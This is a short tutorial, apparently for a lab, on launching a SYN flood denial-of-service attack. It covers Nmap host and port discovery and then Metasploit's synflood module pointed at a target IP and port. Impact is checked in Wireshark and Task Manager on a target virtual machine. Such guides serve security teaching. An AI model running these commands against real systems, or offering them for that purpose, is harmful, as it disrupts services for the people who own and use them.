## Step-by-Step Guide

### Use Nmap to Find Nearby Systems, IPs, and Open Ports

1. Open a terminal and run the following Nmap command to scan for nearby systems:
    ```bash
    nmap -sP 192.168.1.0/24
    ```
    This will give you a list of nearby systems with their IP addresses.

2. To find open ports on a specific system, use:
    ```bash
    nmap -sV 192.168.1.X
    ```
    Replace `192.168.1.X` with the IP address of the target system.

### Take Note of the IPv4 and Open Port

- Note down the IPv4 address and the open port of the target system.

### Open Metasploit

1. Open a terminal and start Metasploit with the following command:
    ```bash
    msfconsole
    ```

### Search for ‚Äúsynflood‚Äù and Use ‚Äúauxiliary/dos/tcp/synflood‚Äù

1. In the Metasploit console, search for the SYN flood module:
    ```bash
    search synflood
    ```

2. Use the SYN flood auxiliary module:
    ```bash
    use auxiliary/dos/tcp/synflood
    ```

### Set RHOSTS and RPORT

1. Type in `options` to see the required settings.
    ```bash
    options
    ```

2. Set `RHOSTS` to the target‚Äôs IPv4 address:
    ```bash
    set RHOSTS 192.168.1.X
    ```
    Replace `192.168.1.X` with the target‚Äôs IPv4 address.

3. Set `RPORT` to the target‚Äôs open port:
    ```bash
    set RPORT Y
    ```
    Replace `Y` with the target‚Äôs open port number.

### Run the SYN Flood Attack

1. Type in `exploit` to run the SYN flood attack:
    ```bash
    exploit
    ```

### Monitor the Attack with Wireshark and Task Manager

1. Switch to your target virtual machine (VM).
2. Open Wireshark to view the packets being sent by the attack.
3. Open Task Manager to monitor the strain on the system.
    - In Wireshark, start capturing on the network interface to observe the flood of SYN packets.
    - In Task Manager, observe the system resources, such as CPU and memory usage, to see the impact of the attack.
